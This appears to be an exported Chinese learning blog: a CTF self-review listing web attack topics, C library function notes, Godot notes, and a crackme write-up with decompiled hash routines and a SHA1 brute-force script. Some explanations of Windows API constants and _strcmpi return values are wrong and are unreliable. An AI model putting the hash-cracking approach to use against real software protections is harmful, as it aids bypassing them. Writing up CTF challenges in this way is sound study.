<li>cpp</li>
<li>python</li>
<li>java</li>
<li>javascript</li>
<li>…</li>
</ul>
</li>
<li><p>伪C方面</p>
<ul>
<li>C的各种指针<ul>
<li>-&gt;</li>
<li>&amp;</li>
<li>[]…多重嵌套</li>
<li>位运算</li>
<li>异或运算</li>
<li>结构体</li>
</ul>
</li>
<li>代码阅读能力</li>
<li>py2</li>
<li>javaScript的复杂代码</li>
</ul>
</li>
<li><p>smali方面</p>
<ul>
<li>dex++</li>
<li>dex</li>
</ul>
</li>
<li><p>其他方面：</p>
<ul>
<li>脱壳经验少</li>
<li>ghidraRun 使用少</li>
<li>ollydbg</li>
<li>二进制插桩</li>
<li>debug调试</li>
</ul>
</li>
<li><p>表达式推导能力</p>
</li>
<li><p>逆推能力</p>
</li>
<li><p>各方面的效率，思路思维</p>
</li>
</ul>
</li>
<li><p>WEB</p>
<ul>
<li>web方向体系不完善</li>
<li>思路不完整</li>
<li>工具掌握不全面</li>
<li>正确体系：<ul>
<li>情报搜集<ul>
<li>端口扫描</li>
<li>源码刨析</li>
<li>接口查找</li>
<li>提示寻找</li>
</ul>
</li>
<li>攻击类型探索<ul>
<li>XXE</li>
<li>反序列化</li>
<li>SQL注入</li>
<li>基于框架的漏洞：如flask算pin</li>
<li>基于配置的漏洞</li>
</ul>
</li>
<li>基于已知情报的攻击计划<ul>
<li>挂马</li>
<li>注入</li>
<li>反弹shell</li>
<li>XSS</li>
<li>破解</li>
</ul>
</li>
<li>攻击实操时工具的使用<ul>
<li>Bp</li>
<li>hackerBar</li>
<li>Fiddler</li>
<li>WireShark</li>
<li>改包脚本 发包脚本 curl wget</li>
</ul>
</li>
<li>经验…</li>
<li>各类框架体系：<ul>
<li>php</li>
<li>jsp</li>
<li>静态html apache nginx</li>
<li>flask : jinjia2</li>
<li>djongo</li>
<li>ktro</li>
<li>javalin</li>
<li>后端无止境</li>
<li>还需多前行</li>
<li>多读CVE</li>
</ul>
</li>
<li>漏洞体系：<ul>
<li>文件上传蚁剑类</li>
<li>冰蝎类</li>
<li>内存马</li>
<li>…</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>杂项</p>
<ul>
<li><p>解密题目数量少</p>
</li>
<li><p>脚本能力一般</p>
</li>
<li><p>听力差，手敲摩斯密码能力差，需音频解析软件辅助</p>
</li>
<li><p>古典密码认知少</p>
</li>
<li><p>知其浅薄原理而不知其根本，没有真正理解古典密码的加密方式</p>
</li>
<li><p>流量分析类</p>
</li>
<li><p>文件检索能力差</p>
</li>
<li><p>各类协议原理仍然不够了解</p>
</li>
</ul>
</li>
<li><p>密码学</p>
<ul>
<li>目前仅会解简单RSA</li>
<li>需多看源码</li>
<li>加密过程</li>
<li>加密方式</li>
<li>解密过程</li>
<li>解密方式</li>
<li>密钥获取</li>
</ul>
</li>
</ol>
<pre><code>
</code></pre>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>基础</tag>
        <tag>反思</tag>
      </tags>
  </entry>
  <entry>
    <title>2024-11-17-C库函数学习frist</title>
    <url>/2024/11/17/2024-11-17-C%E5%BA%93%E5%87%BD%E6%95%B0%E5%AD%A6%E4%B9%A0frist/</url>
    <content><![CDATA[<h2 id="函数内容"><a href="#函数内容" class="headerlink" title="函数内容"></a>函数内容</h2><p>由于pwn 以及 Reverse 方向需要大量的基础函数知识，固在此记录遇到的陌生的函数用。</p>
<p><code>memset</code>设置指定内存中的内容</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用法一</span></span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// C库函数学习</span></span><br><span class="line">    <span class="built_in">memset</span>(arr, <span class="number">0</span>, <span class="built_in">sizeof</span>(arr));</span><br><span class="line">    <span class="comment">// 输出数组内容，验证是否已清零</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 用法二</span></span><br><span class="line">    <span class="type">int</span> num = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;num,<span class="number">5</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,num);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">outPut: 0 0 0 0 0 0 0 0 0 0 5</span><br></pre></td></tr></table></figure>

<p><code>atoi</code> 将字符串的数字转成int的数字</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用法一</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *str = <span class="string">&quot;123abc&quot;</span>; <span class="comment">// 指针方式声明字符串</span></span><br><span class="line">    <span class="type">int</span> num = <span class="built_in">atoi</span>(str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, num);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用法二</span></span><br><span class="line">    <span class="type">char</span> test1[<span class="number">5</span>] = <span class="string">&quot;1234&quot;</span>; <span class="comment">// 因为加一个终止符所以数组大小要更大</span></span><br><span class="line">    <span class="type">char</span> test2[<span class="number">7</span>] = <span class="string">&quot;abcdef&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> t1 = <span class="built_in">atoi</span>(test1);</span><br><span class="line">    <span class="type">int</span> t2 = <span class="built_in">atoi</span>(test2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d,%d&quot;</span>,t1,t2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">outPut:</span><br><span class="line">123</span><br><span class="line">1234,0</span><br></pre></td></tr></table></figure>

<p><code>strcat</code>用于将一个字符串连接到另一个字符串的末尾</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用法</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *str = <span class="string">&quot;123abc&quot;</span>; <span class="comment">// 指针方式声明字符串</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> test1[<span class="number">9</span>] = <span class="string">&quot;1234&quot;</span>;</span><br><span class="line">    <span class="type">char</span> result[<span class="number">20</span>];</span><br><span class="line">    <span class="comment">// 先把 str 复制到 result 中</span></span><br><span class="line">    <span class="built_in">strcpy</span>(result, str);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 strcat 连接 test1 到 result</span></span><br><span class="line">    <span class="built_in">strcat</span>(result, test1);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, result);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>outPut: 123abc1234</code></p>
]]></content>
      <tags>
        <tag>C</tag>
        <tag>cpp</tag>
      </tags>
  </entry>
  <entry>
    <title>2024-11-18-ClibStudySecond</title>
    <url>/2024/11/18/2024-11-18-ClibStudySecond/</url>
    <content><![CDATA[<h2 id="函数内容"><a href="#函数内容" class="headerlink" title="函数内容"></a>函数内容</h2><p>由于pwn 以及 Reverse 方向需要大量的基础函数知识，固在此记录遇到的陌生的函数用。</p>
<p><code>_strcmpi()</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用法</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *str1 = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *str2 = <span class="string">&quot;baka&quot;</span>;</span><br><span class="line">    <span class="type">int</span> result1 = _strcmpi(str1, str2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,result1);</span><br><span class="line">    <span class="comment">// 不相同返回1</span></span><br><span class="line">    <span class="type">int</span> result2 = _strcmpi(str1, str1);</span><br><span class="line">    <span class="comment">// 相同返回0</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,result2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>ouPut: 10</code></p>
<p><code>wsprintfA()</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">    <span class="type">int</span> value = <span class="number">42</span>;</span><br><span class="line">    <span class="comment">// 用于格式化字符串 属于 wsprintf 的 ANSI 版本</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//输出缓冲区 格式化控制字符串  格式化数据</span></span><br><span class="line">    <span class="built_in">wsprintfA</span>(buffer, <span class="string">&quot;The value is %d&quot;</span>, value);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buffer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>outPut: The value is 42</code></p>
]]></content>
      <tags>
        <tag>C</tag>
        <tag>cpp</tag>
      </tags>
  </entry>
  <entry>
    <title>2024-11-19-GodotFastIn</title>
    <url>/2024/11/19/2024-11-19-GodotFastIn/</url>
    <content><![CDATA[<h2 id="设置godot为C-模式"><a href="#设置godot为C-模式" class="headerlink" title="设置godot为C#模式"></a>设置godot为C#模式</h2><p>godot默认脚本为GDScript，我们需要手动设置项目的脚本为C#</p>
<p>前提：mono 版本 godot</p>
<p><code>右键控件添加脚本</code> &gt; <code>选择语言为C#</code></p>
<h3 id="基本编程思路"><a href="#基本编程思路" class="headerlink" title="基本编程思路"></a>基本编程思路</h3><p>信号 + 函数</p>
<p>信号可以发送到函数让脚本中的函数接收</p>
<p>相当于在脚本中定义，就可以触发脚本中定义的函数。</p>
<h3 id="主界面思路"><a href="#主界面思路" class="headerlink" title="主界面思路"></a>主界面思路</h3><p>使用隐藏界面的方法来进行不同界面之间的切换</p>
<p>可能还需要考虑一下不同资源的释放</p>
]]></content>
      <tags>
        <tag>C#</tag>
        <tag>godot</tag>
      </tags>
  </entry>
  <entry>
    <title>2024-11-20-SHABOOM</title>
    <url>/2024/11/20/2024-11-20-SHABOOM/</url>
    <content><![CDATA[<h2 id="反汇编得到的加密函数"><a href="#反汇编得到的加密函数" class="headerlink" title="反汇编得到的加密函数"></a>反汇编得到的加密函数</h2><p><code>sub_401230</code></p>
<p>SHA</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_401230</span><span class="params">(BYTE *pbData, DWORD dwDataLen, LPSTR lpString1)</span></span><br><span class="line">&#123;</span><br><span class="line">  DWORD i; <span class="comment">// [esp+4Ch] [ebp-28h]</span></span><br><span class="line">  CHAR String2[<span class="number">4</span>]; <span class="comment">// [esp+50h] [ebp-24h] BYREF</span></span><br><span class="line">  BYTE v6[<span class="number">20</span>]; <span class="comment">// [esp+54h] [ebp-20h] BYREF</span></span><br><span class="line">  DWORD pdwDataLen; <span class="comment">// [esp+68h] [ebp-Ch] BYREF</span></span><br><span class="line">  HCRYPTHASH phHash; <span class="comment">// [esp+6Ch] [ebp-8h] BYREF</span></span><br><span class="line">  HCRYPTPROV phProv; <span class="comment">// [esp+70h] [ebp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !CryptAcquireContextA(&amp;phProv, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1u</span>, <span class="number">0xF0000000</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( CryptCreateHash(phProv, <span class="number">0x8004</span>u, <span class="number">0</span>, <span class="number">0</span>, &amp;phHash) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( CryptHashData(phHash, pbData, dwDataLen, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      CryptGetHashParam(phHash, <span class="number">2u</span>, v6, &amp;pdwDataLen, <span class="number">0</span>);</span><br><span class="line">      *lpString1 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; pdwDataLen; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        wsprintfA(String2, <span class="string">&quot;%02X&quot;</span>, v6[i]);</span><br><span class="line">        lstrcatA(lpString1, String2);</span><br><span class="line">      &#125;</span><br><span class="line">      CryptDestroyHash(phHash);</span><br><span class="line">      CryptReleaseContext(phProv, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      CryptDestroyHash(phHash);</span><br><span class="line">      CryptReleaseContext(phProv, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    CryptReleaseContext(phProv, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>sub_401040</code>MD5</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_401040</span><span class="params">(BYTE *pbData, DWORD dwDataLen, LPSTR lpString1)</span></span><br><span class="line">&#123;</span><br><span class="line">  DWORD i; <span class="comment">// [esp+4Ch] [ebp-24h]</span></span><br><span class="line">  CHAR String2[<span class="number">4</span>]; <span class="comment">// [esp+50h] [ebp-20h] BYREF</span></span><br><span class="line">  BYTE v6[<span class="number">16</span>]; <span class="comment">// [esp+54h] [ebp-1Ch] BYREF</span></span><br><span class="line">  DWORD pdwDataLen; <span class="comment">// [esp+64h] [ebp-Ch] BYREF</span></span><br><span class="line">  HCRYPTHASH phHash; <span class="comment">// [esp+68h] [ebp-8h] BYREF</span></span><br><span class="line">  HCRYPTPROV phProv; <span class="comment">// [esp+6Ch] [ebp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !CryptAcquireContextA(&amp;phProv, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1u</span>, <span class="number">0xF0000000</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( CryptCreateHash(phProv, <span class="number">0x8003</span>u, <span class="number">0</span>, <span class="number">0</span>, &amp;phHash) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( CryptHashData(phHash, pbData, dwDataLen, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      CryptGetHashParam(phHash, <span class="number">2u</span>, v6, &amp;pdwDataLen, <span class="number">0</span>);</span><br><span class="line">      *lpString1 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; pdwDataLen; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        wsprintfA(String2, <span class="string">&quot;%02X&quot;</span>, v6[i]);</span><br><span class="line">        lstrcatA(lpString1, String2);</span><br><span class="line">      &#125;</span><br><span class="line">      CryptDestroyHash(phHash);</span><br><span class="line">      CryptReleaseContext(phProv, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      CryptDestroyHash(phHash);</span><br><span class="line">      CryptReleaseContext(phProv, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    CryptReleaseContext(phProv, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="通过中间函数简单访问"><a href="#通过中间函数简单访问" class="headerlink" title="通过中间函数简单访问"></a>通过中间函数简单访问</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;testCode.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_40100A</span><span class="params">(BYTE *pbData, DWORD dwDataLen, LPSTR lpString1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_401230(pbData, dwDataLen, lpString1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="我的解密过程"><a href="#我的解密过程" class="headerlink" title="我的解密过程"></a>我的解密过程</h3><h4 id="首先是基本情报搜集"><a href="#首先是基本情报搜集" class="headerlink" title="首先是基本情报搜集"></a>首先是基本情报搜集</h4><p>len(Destination) &#x3D; 6
v3 &#x3D; 6
v7 &#x3D;  Destination 中的数字
v7 &gt; 100000 也就是六位数起步
Destination 然后末尾加上 @DBApp
String1 将包含由传入数据 Destination 和长度 v3 计算出的哈希值的十六进制表示
String1 &#x3D;&#x3D; Hax(Destination) &#x3D;&#x3D; 6E32D0943418C2C33385BC35A1470250DD8923A9</p>
<p>Str 长度v4
v4 &#x3D;&#x3D; 6
String1  &#x3D;&#x3D; MD5(Str)
String1 &#x3D;&#x3D; 27019e688a4e62a649fd99cadaafdb4e</p>
<hr>
<p>Destination由数字构成
且数字长度(v7) &#x3D;&#x3D; 6
六位数的数字
传入v3和原型计算出sha &#x3D; 6E32D0943418C2C33385BC35A1470250DD8923A9
逆推或爆破 原型</p>
<hr>
<p>Str也是 6位
但是经过了 strcat
所以
Str + Destination的md5值是 27019e688a4e62a649fd99cadaafdb4e</p>
<h4 id="解密脚本-SHA部分"><a href="#解密脚本-SHA部分" class="headerlink" title="解密脚本 SHA部分"></a>解密脚本 SHA部分</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;testCode.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;test.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">testHeadFile</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> String1[<span class="number">260</span>];</span><br><span class="line">    <span class="built_in">memset</span>(String1, <span class="number">0</span>, <span class="built_in">sizeof</span>(String1)); <span class="comment">// 填充0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// for循环爆破</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> num = <span class="number">0</span>; num &lt; <span class="number">1000000</span>; num++)&#123;</span><br><span class="line">        std::string Destination = std::<span class="built_in">to_string</span>(num);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (Destination.<span class="built_in">length</span>() &lt; <span class="number">6</span>) &#123;</span><br><span class="line">            Destination = <span class="string">&#x27;0&#x27;</span> + Destination;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> String1[<span class="number">256</span>];</span><br><span class="line">        cout &lt;&lt; Destination &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> destinationWithSuffix[<span class="number">512</span>];</span><br><span class="line">        <span class="built_in">strcpy</span>(destinationWithSuffix, Destination.<span class="built_in">c_str</span>()); <span class="comment">// 类型转换</span></span><br><span class="line">        <span class="built_in">strcat</span>(destinationWithSuffix, <span class="string">&quot;@DBApp&quot;</span>); <span class="comment">// 拼凑字符</span></span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> v3;</span><br><span class="line"></span><br><span class="line">        v3 = <span class="built_in">strlen</span>(destinationWithSuffix);</span><br><span class="line">        <span class="built_in">sub_40100A</span>((BYTE*)destinationWithSuffix, v3, String1);</span><br><span class="line">        <span class="keyword">if</span> (_strcmpi(String1, <span class="string">&quot;6E32D0943418C2C33385BC35A1470250DD8923A9&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;correct:&quot;</span> &lt;&lt; endl; <span class="comment">// 爆破成功</span></span><br><span class="line">            cout &lt;&lt; Destination &lt;&lt; endl;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;@DBApp&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>cpp</tag>
        <tag>Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>2024-11-20-XORandRtf</title>
    <url>/2024/11/20/2024-11-20-XORandRtf/</url>
    <content><![CDATA[<h2 id="反汇编代码审计"><a href="#反汇编代码审计" class="headerlink" title="反汇编代码审计"></a>反汇编代码审计</h2><p>进入 <code>sub_4014D0</code> 后</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> __cdecl <span class="title function_">sub_4014D0</span><span class="params">(LPCSTR lpString)</span></span><br><span class="line">&#123;</span><br><span class="line">  LPCVOID lpBuffer; <span class="comment">// [esp+50h] [ebp-1Ch]</span></span><br><span class="line">  DWORD NumberOfBytesWritten; <span class="comment">// [esp+58h] [ebp-14h] BYREF</span></span><br><span class="line">  DWORD nNumberOfBytesToWrite; <span class="comment">// [esp+5Ch] [ebp-10h]</span></span><br><span class="line">  HGLOBAL hResData; <span class="comment">// [esp+60h] [ebp-Ch]</span></span><br><span class="line">  HRSRC hResInfo; <span class="comment">// [esp+64h] [ebp-8h]</span></span><br><span class="line">  HANDLE hFile; <span class="comment">// [esp+68h] [ebp-4h]</span></span><br><span class="line"><span class="comment">// 从上往下声明六个变量</span></span><br><span class="line"><span class="comment">// 根据变量名推断意思为 lp 缓冲区 、写入字节数、要写入的字节数、h资源数据、h资源信息、h文件</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">  hFile = <span class="number">0</span>;</span><br><span class="line">  hResData = <span class="number">0</span>;</span><br><span class="line">  nNumberOfBytesToWrite = <span class="number">0</span>;</span><br><span class="line">  NumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 变量名初始化</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">  hResInfo = FindResourceA(<span class="number">0</span>, (LPCSTR)<span class="number">0x65</span>, <span class="string">&quot;AAA&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !hResInfo )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  nNumberOfBytesToWrite = SizeofResource(<span class="number">0</span>, hResInfo);</span><br><span class="line">  hResData = LoadResource(<span class="number">0</span>, hResInfo);</span><br><span class="line">  <span class="keyword">if</span> ( !hResData )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  lpBuffer = LockResource(hResData);</span><br><span class="line">  sub_401005(lpString, (<span class="type">int</span>)lpBuffer, nNumberOfBytesToWrite);</span><br><span class="line">    <span class="comment">// 明白结果是创建 rtf文件</span></span><br><span class="line">  hFile = CreateFileA(<span class="string">&quot;dbapp.rtf&quot;</span>, <span class="number">0x10000000</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( hFile == (HANDLE)<span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &amp;NumberOfBytesWritten, <span class="number">0</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  CloseHandle(hFile);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据函数原型逆推代码作用</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">HANDLE <span class="title function_">CreateFileA</span><span class="params">(</span></span><br><span class="line"><span class="params">  LPCSTR                lpFileName,        <span class="comment">// 文件或设备的名称</span></span></span><br><span class="line"><span class="params">  DWORD                 dwDesiredAccess,   <span class="comment">// 访问权限</span></span></span><br><span class="line"><span class="params">  DWORD                 dwShareMode,       <span class="comment">// 文件共享模式</span></span></span><br><span class="line"><span class="params">  LPSECURITY_ATTRIBUTES lpSecurityAttributes, <span class="comment">// 安全属性</span></span></span><br><span class="line"><span class="params">  DWORD                 dwCreationDisposition, <span class="comment">// 如何创建或打开文件</span></span></span><br><span class="line"><span class="params">  DWORD                 dwFlagsAndAttributes,  <span class="comment">// 文件属性和标志</span></span></span><br><span class="line"><span class="params">  HANDLE                hTemplateFile     <span class="comment">// 模板文件句柄</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p><code>CreateFileA(&quot;dbapp.rtf&quot;, 0x10000000u, 0, 0, 2u, 0x80u, 0);</code></p>
<p>文件名 <code>dbapp.rtf</code></p>
<p><code>0x10000000</code> 等同于 <code>GENERIC_READ</code>，意味着请求对文件的读取权限。</p>
<p><code>0</code> 表示不允许文件与其他进程共享。</p>
<p><code>0</code> 表示不设置安全属性，使用默认的安全设置。</p>
<p><code>2u</code> 等同 <code>OPEN_ALWAYS</code> 类似<code>python open 的 a+</code> 文件存在则打开，文件不存在则创建新的</p>
<p><code>0x80u</code> 是 <code>FILE_FLAG_NO_BUFFERING</code>，表示文件操作将不使用系统缓存进行缓冲，要求应用程序直接与物理存储进行交互。通常用于高效的文件操作。
<code>0</code> 表示没有模板文件，通常设置为 <code>NULL</code>，即不使用任何模板文件</p>
<h3 id="上方的可疑代码"><a href="#上方的可疑代码" class="headerlink" title="上方的可疑代码"></a>上方的可疑代码</h3><p><code>  hResInfo = FindResourceA(0, (LPCSTR)0x65, &quot;AAA&quot;);</code></p>
